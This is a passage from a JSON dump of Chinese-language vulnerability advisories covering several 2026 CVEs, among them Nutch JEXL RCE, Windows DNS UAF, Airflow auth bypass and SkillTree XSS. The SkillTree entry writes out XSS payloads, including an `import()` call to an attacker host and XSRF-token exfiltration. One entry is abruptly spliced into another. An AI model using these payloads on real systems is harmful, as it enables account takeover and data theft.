tent": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。", "title": "什么是代码注入"}, {"content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。", "title": "代码注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。", "title": "如何预防代码注入"}], "cnvd_id": "", "cve_id": "CVE-2026-41870", "cvss": {}, "cvss_score": 9.8, "cvss_vector": "", "cwe": "CWE-94", "description": "Apache Nutch 是开源、可扩展的 Web 爬虫，用于大规模网页采集、解析和索引，并在 1.11 至 1.22 版本中打包基于 JAX-RS 的 Nutch Server REST API。\n受影响版本中，Nutch Server REST API 未实施认证授权，远程攻击者可向 /job/create 或 /db/crawldb 提交包含恶意 JEXL 表达式的请求。JexlUtil.parseExpression 使用未启用沙箱的 Commons JEXL 引擎解析该表达式，允许通过 new 运算符实例化任意 Java 类并在服务进程中执行代码。\n修复版本中通过删除整个 Nutch Server 及 REST API 切断该未授权远程入口，并在 JexlUtil.parseExpression 中启用 JexlSandbox、禁止 new 实例化，阻止不可信 JEXL 表达式再进入任意代码执行路径。", "effects": [{"comp_name": "org.apache.nutch:nutch", "ecosystem": "maven", "versions": [{"affected_version": "[1.11,1.23)", "min_fixed_version": "1.23", "repository": "maven", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-09-08", "level": "Critical", "mps_id": "MPS-ba43-1803", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "http://www.mail-archive.com/announce@apache.org/msg11848.html", "name": ""}, {"url": "https://nutch.apache.org/documentation/security/", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-41870", "name": ""}, {"url": "https://issues.apache.org/jira/browse/NUTCH-3165", "name": ""}, {"url": "https://issues.apache.org/jira/browse/NUTCH-3168", "name": ""}, {"url": "https://github.com/apache/nutch/commit/3b663de2e4c829267297814db8d231d037c586f7", "name": ""}, {"url": "https://github.com/apache/nutch/commit/df62fa10fbe2135e8f51dee9d08c22414c9cc750", "name": ""}, {"url": "https://github.com/apache/nutch", "name": ""}, {"url": "https://nutch.apache.org/", "name": ""}], "scope_influence": "", "tags": ["java", "开源"], "title": "Nutch JEXL注入RCE", "_translated": true, "_saved_at": "2026-09-08T12:30:58+00:00", "_first_saved_at": "2026-09-08T12:30:58+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ba43-1803"}, {"analysis_status": 0, "articles": [], "attack_vector_type": "Network", "cnvd_id": "", "cve_id": "CVE-2026-86287", "cvss": {}, "cvss_score": 9.8, "cvss_vector": "", "cwe": "CWE-1287", "description": "Net::IP::LPM 是开源 Perl 模块，实现最长前缀匹配算法，用于按 CIDR 前缀查找地址，并常被用于构建放行列表或拒绝列表。\n受影响版本中，公开方法 add 在按斜杠拆分 $prefix 后，未校验前缀长度是否为十进制整数，也未确认 inet_pton 转换是否成功。非数字及非 ASCII 前缀长度会被数值化为 0；超过 31 位的整数在 XS 函数 lpm_add_raw 中以 C int 接收并静默截断，2**32 等值会变为 0。长度为 0 的前缀作为默认路由写入 Trie 后，lookup 会对任意地址匹配成功，放行列表将放行全部地址，拒绝列表将拦截全部地址。\n修复版本中通过在 add 中拒绝转换失败的前缀地址，并以 /^[0-9]+$/ 限定前缀长度只能是十进制整数，同时将 lpm_add_raw 的 prefix_len 类型由 int 改为 Perl IV，使超范围长度进入既有越界检查并被拒绝，避免畸形掩码污染查找表。", "effects": [{"comp_name": "Net-IP-LPM", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.12)", "min_fixed_version": "1.12", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "指定类型的输入验证不当", "kind_en": "指定类型输入的验证不正确", "last_modified_time": "2026-09-08", "level": "Critical", "mps_id": "MPS-utin-zeds", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-utin-zeds", "name": "https://www.oscs1024.com/hd/MPS-utin-zeds"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-862  GKE 环境中，适用于 Python 版本 2.0.0 至 2.6.0 的 Google Cloud Agent Development Kit (ADK) 中的 adk web 中存在代码注入漏洞，允许未经身份验证的远程攻击者使用精心设计的测试会话重放来执行任意代码。", "effects": [{"comp_name": "Agent Development Kit (ADK) for Python", "ecosystem": "linux", "versions": [{"affected_version": "(2.0.0,2.7.0)", "min_fixed_version": "2.7.0", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "不完整的黑名单", "kind_en": "不允许的输入的不完整列表", "last_modified_time": "2026-09-09", "level": "Critical", "mps_id": "MPS-64y8-qhed", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-64y8-qhed", "name": "https://www.oscs1024.com/hd/MPS-64y8-qhed"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-79696", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-79696"}, {"url": "https://github.com/google/adk-python/releases/tag/v2.7.0", "name": ""}, {"url": "https://github.com/google/adk-python/commit/a16f6da3314b8dcd9925884cd6fc7fc9ffdd570d", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "通过不完整的标准库拒绝列表在 Google ADK for Python 中远程执行代码", "_translated": true, "_saved_at": "2026-09-09T10:35:58+00:00", "_first_saved_at": "2026-09-09T10:35:58+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-64y8-qhed"}, {"analysis_status": 3, "articles": [{"content": "应用程序使用已释放的内存区域。当一个对象被释放后，程序可能继续引用该内存地址，导致使用了无效的内存。攻击者可以利用这个漏洞，通过修改已释放的内存内容来执行恶意代码或者获取敏感信息。", "title": "什么是UAF"}, {"content": "- 悬空指针攻击：攻击者利用程序中的已释放指针，重新分配内存并故意将指针指向已释放的内存区域。然后，当程序继续使用该指针时，攻击者可以执行恶意代码或者篡改内存数据。\r\n- 虚函数表劫持：针对面向对象的程序，攻击者可以通过修改已释放对象的虚函数表（VTable）指针，来改变程序的行为。攻击者可以控制程序执行任意代码或者调用任意函数。\r\n- 堆喷射：攻击者通过大量分配和释放特定大小的内存块，以创建特定的内存布局。然后，攻击者可以利用UAF漏洞来操作特定的内存块，例如修改函数指针，从而实现代码执行。", "title": "UAF常见的攻击方式"}, {"content": "- 释放后置空指针：在释放内存后，立即将指针置为空，防止后续误用。\r\n- 使用析构函数：在对象被释放时，使用析构函数来清理相关资源，避免UAF漏洞的发生。\r\n- 使用引用计数或垃圾回收机制：引入引用计数或垃圾回收机制可以自动处理内存释放，减少UAF的发生。\r\n- 使用现代化的编程语言和框架：现代编程语言和框架通常具有内存管理机制，如自动内存回收和强类型检查，可以有效减少UAF漏洞的发生。\r\n- 定期更新和修复：及时更新和修复软件，包括操作系统、应用程序和库文件，以防止已知的UAF漏洞被攻击利用。", "title": "如何预防UAF"}], "cnvd_id": "", "cve_id": "CVE-2026-69730", "cvss": {"cvssv31": [{"source": "secure@microsoft.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}, {"source": "murphysec", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}]}, "cvss_score": 9.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-416", "description": "Windows DNS Server 是 Microsoft Windows 中的闭源域名解析服务组件，用于提供 DNS 查询应答与区域托管，常见于域控制器与企业 DNS 基础设施。\n受影响版本中，Windows DNS 存在释放后使用缺陷。未授权攻击者可在无需身份认证、无需用户交互的条件下，向受影响服务发送构造的网络数据包并在目标系统上执行代码，造成远程代码执行漏洞。\n修复版本中通过 Microsoft 2026 年 9 月安全更新，将各受影响产品更新到官方给出的修复构建号或更高版本，切断该释放后使用缺陷通向远程代码执行的路径。", "effects": [{"comp_name": "windows_10_1607", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.14393.0,10.0.14393.9512)", "min_fixed_version": "10.0.14393.9512", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_10_1809", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.17763.0,10.0.17763.9245)", "min_fixed_version": "10.0.17763.9245", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2012", "ecosystem": "linux", "versions": [{"affected_version": "[6.2.9200.0,6.2.9200.26349)", "min_fixed_version": "6.2.9200.26349", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2012_r2", "ecosystem": "linux", "versions": [{"affected_version": "[6.3.9600.0,6.3.9600.23397)", "min_fixed_version": "6.3.9600.23397", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2016", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.14393.0,10.0.14393.9512)", "min_fixed_version": "10.0.14393.9512", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2019", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.17763.0,10.0.17763.9245)", "min_fixed_version": "10.0.17763.9245", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2022", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.20348.0,10.0.20348.5622)", "min_fixed_version": "10.0.20348.5622", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_server_2025", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.26100.0,10.0.26100.33438)", "min_fixed_version": "10.0.26100.33438", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "UAF", "kind_en": "免费后使用", "last_modified_time": "2026-09-09", "level": "Critical", "mps_id": "MPS-4r15-w7fj", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-4r15-w7fj", "name": "https://www.oscs1024.com/hd/MPS-4r15-w7fj"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69730", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-69730"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69730", "name": "Windows DNS Server Remote Code Execution Vulnerability"}], "scope_influence": "广", "tags": ["专家校准", "操作系统"], "title": "Windows DNS Server远程代码执行漏洞", "_translated": true, "_saved_at": "2026-09-09T10:35:48+00:00", "_first_saved_at": "2026-09-09T10:35:48+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-4r15-w7fj"}, {"analysis_status": 0, "articles": [{"content": "应用程序在进行身份验证时使用了不恰当的机制或实施不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-75156", "cvss": {}, "cvss_score": 9.8, "cvss_vector": "", "cwe": "CWE-287", "description": "Apache Airflow FAB provider（apache-airflow-providers-fab）是开源工作流平台 Apache Airflow 的 Flask App Builder 认证管理组件，用于提供 Web UI 登录、角色权限控制以及 Azure AD 等 OAuth 单点登录。\n受影响版本中，FAB 认证管理器在 Azure AD OAuth 登录路径上由 get_oauth_user_info 读取 resp 中的 id_token，再交由 _decode_and_validate_azure_jwt 处理。该方法使用 Microsoft 多租户 JWKS 校验签名，但调用 authlib_jwt.decode 时未传入 claims_options，claims.validate() 不检查 issuer 与 audience。攻击者可在自建 Azure 租户中签发通过签名校验的 id_token，使系统按令牌内 oid、email、roles 完成登录与角色分配，从而在无该部署既有访问权限的情况下进入 Airflow UI。\n修复版本中通过在 _decode_and_validate_azure_jwt 中解析部署所配置的 Azure 租户，并向 decode 传入 claims_options，要求 iss 属于该租户、aud 等于应用 client_id；当配置无法确定单一租户时拒绝接受令牌，切断跨租户令牌进入身份与角色映射的路径。", "effects": [{"comp_name": "apache-airflow-providers-fab", "ecosystem": "pip", "versions": [{"affected_version": "[3.7.3,3.8.1)", "min_fixed_version": "3.8.1", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "可选修复", "kind": "身份验证不当", "kind_en": "认证不当", "last_modified_time": "2026-09-09", "level": "Critical", "mps_id": "MPS-ae73-84ff", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.openwall.com/lists/oss-security/2026/09/08/13", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-75156", "name": ""}, {"url": "https://github.com/apache/airflow/pull/71735", "name": ""}, {"url": "https://github.com/apache/airflow/commit/75ecbdd36d89db8ae41b891bc0d41acf9b655723", "name": ""}, {"url": "https://github.com/apache/airflow/blob/providers-fab/3.8.1/providers/fab/docs/changelog.rst", "name": ""}, {"url": "https://pypi.org/project/apache-airflow-providers-fab/3.8.1/", "name": ""}, {"url": "https://airflow.apache.org/", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-59243", "name": ""}], "scope_influence": "", "tags": ["python", "开源", "终端软件"], "title": "Airflow FAB认证绕过", "_translated": true, "_saved_at": "2026-09-08T16:59:16+00:00", "_first_saved_at": "2026-09-08T16:59:16+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ae73-84ff"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-86738", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N", "severity": "high", "base_score": 8.7}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.3}]}, "cvss_score": 9.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-79", "description": "Snipe-IT 是开源 IT 资产管理系统，基于 Laravel 构建，用于资产盘点、库存与设备全生命周期管理。\n受影响版本中，超级管理员通过 SettingsController::postBranding 写入的 custom_css 会在 Setting::show_custom_css() 中先经 e() HTML 编码，再把 \u0026gt; 与 \u0026quot; 解码回 \u003e 和 \"，使 @import 与外部 url() 原样进入全局 style。其他超级管理员加载任意页面时，攻击者可用 input[name=\"_token\"] 属性选择器逐字符带出 CSRF token，进而伪造状态变更请求接管账户。\n修复版本中通过重写 show_custom_css()，改为 strip_tags()、剥离 @import 规则并拒绝外部及 data/javascript/vbscript 协议的 url() 引用，切断恶意样式外带与 CSRF token 泄露路径。", "effects": [{"comp_name": "grokability/snipe-it", "ecosystem": "composer", "versions": [{"affected_version": "[3.0,8.7.0)", "min_fixed_version": "8.7.0", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "last_modified_time": "2026-09-08", "level": "Critical", "mps_id": "MPS-87fg-q2kl", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-87fg-q2kl", "name": "https://www.oscs1024.com/hd/MPS-87fg-q2kl"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86738", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86738"}, {"url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-pvcw-mp8q-mj39", "name": "GitHub Security Advisory (GHSA-pvcw-mp8q-mj39)"}, {"url": "https://github.com/grokability/snipe-it/commit/d26d71688359707f3b257fc04fe6c3e5a17405f9", "name": "Patch Commit"}, {"url": "https://www.vulncheck.com/advisories/snipe-it-before-8.7.0-css-injection-via-custom-css", "name": "VulnCheck Advisory: Snipe-IT before 8.7.0 CSS Injection via Custom CSS"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Snipe-IT CSS注入漏洞", "_translated": true, "_saved_at": "2026-09-08T16:59:18+00:00", "_first_saved_at": "2026-09-08T16:59:18+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-87fg-q2kl"}, {"analysis_status": 0, "articles": [], "attack_vector_type": "Network", "cnvd_id": "", "cve_id": "CVE-2026-71809", "cvss": {}, "cvss_score": 9.8, "cvss_vector": "", "cwe": "CWE-798", "description": "暹罗点餐（Siam Ordering，siam-server）是一套基于 Java Spring Boot 开发的开源餐饮点餐系统，提供用户端、商户端与后台管理端多角色的手机验证码登录与密码找回能力。\n受影响版本中，AdminServiceImpl、MerchantServiceImpl、MemberServiceImpl 等服务在处理短信验证码时对固定值 123456 直接放行，形成万能验证码；/rest/admin/loginByMobile、/rest/merchant/loginByMobile、/rest/member/verification/login 等登录与找回密码接口被登录拦截器排除，可被未认证请求直接访问，远程攻击者仅需目标账号手机号并提交 mobileCode=123456，即可冒充任意用户、商户或管理员通过校验并获取会话令牌。\n修复版本中通过，可通过删除各登录与密码找回流程中硬编码的万能验证码放行分支，统一改为 SmsLog 短信验证码比对，并限制相关接口的公网访问与验证码尝试频率，以切断该绕过链路。", "effects": [{"comp_name": "siam-server", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.0.0]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "使用硬编码的凭证", "kind_en": "使用硬编码凭证", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-fsct-xbu1", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-fsct-xbu1", "name": "https://www.oscs1024.com/hd/MPS-fsct-xbu1"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-71809", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-71809"}, {"url": "https://github.com/W000i/vuln/issues/11", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "暹罗点餐万能验证码认证绕过漏洞", "_translated": true, "_saved_at": "2026-09-10T02:37:55+00:00", "_first_saved_at": "2026-09-10T02:37:55+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-fsct-xbu1"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-54694", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L", "severity": "critical", "base_score": 9.6}]}, "cvss_score": 9.6, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L", "cwe": "CWE-693", "description": "SkillTree是一个微学习游戏化平台。在 4.4.2 版本之前，两个独立的代码缺陷组合成一个可利用的攻击链，具有三种不同的影响不断升级的利用路径。 `StringHighlighter.js` 通过将原始 `value` 子字符串直接插入到没有 HTML 实体编码的模板文字中来构建 HTML 字符串。 `HighlightedValue.vue` 通过 Vue 的 `v-html` 指令渲染该字符串以及所有未过滤的纯值，该指令设置 `innerHTML`。另外，帐户注册端点接受“firstName”、“lastName”和“nickname”字段，并在不进行任何 HTML 清理的情况下存储它们。攻击者自行注册“firstName = \"\u003cimg src=x onerror=alert(1)\u003e\"”（28 个字符 - 在 30 个字符的字段限制内）并访问任何测验。下次管理员打开“测验运行”页面时，有效负载将在浏览器中执行。存在三种影响不断升级的攻击路径。第一个是基本的跨站点脚本编写。当管理员通过正常使用导航到运行页面时，任何符合 30 个字符限制的自包含有效负载（例如“\u003cimg src=x onerror=alert(1)\u003e”，即 28 个字符）都会自动触发。只需零个额外步骤即可确认管理员浏览器中的任意代码执行。第二个是通过“import()”远程脚本加载。使用分割字段技术（`lastName = \"\u003cimg src=x\"`、`firstName = \"onerror=import('//nsas.cc/p')\u003e\"`），攻击者从其服务器加载完整的 JavaScript 文件。该文件没有大小限制，可以执行任何管理操作 - 删除所有项目、创建后门帐户、转储用户数据、安装键盘记录器。无需网络钓鱼。唯一的限制是 URL 必须包含 11 个字符 (`//nsas.cc/p`)。三是完全跨站请求伪造令牌盗窃。使用“eval(name)”，攻击者首先向管理员发送一个重定向链接，将“window.name”预设为数据盗窃有效负载。会话cookie是`HttpOnly`，不能通过`document.cookie`读取；然而，XSRF 令牌是可读的，攻击者利用同源执行从受害者浏览器内部调用管理 API，将响应转发到外部服务器。除了日常使用之外，不需要任何管理交互。 4.4.2 版包含补丁。", "effects": [{"comp_name": "skills-service", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,4.4.2)", "min_fixed_version": "4.4.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "保护机制失效", "kind_en": "保护机制失效", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-xy34-hwj8", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-xy34-hwj8", "name": "https://www.oscs1024.com/hd/MPS-xy34-hwj8"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54694", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-54694"}, {"url": "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8", "name": "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8"}], "scope_influence": "", "tags": [], "title": "CVE-2026-54694漏洞", "_translated": true, "_saved_at": "2026-09-09T21:27:41+00:00", "_first_saved_at": "2026-09-09T21:27:41+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-xy34-hwj8"}, {"analysis_status": 0, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等。", "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-88069", "cvss": {"cvssv4": [{"source": "5a6e4751-2f3f-4070-9419-94fb35b644e8", "vector": 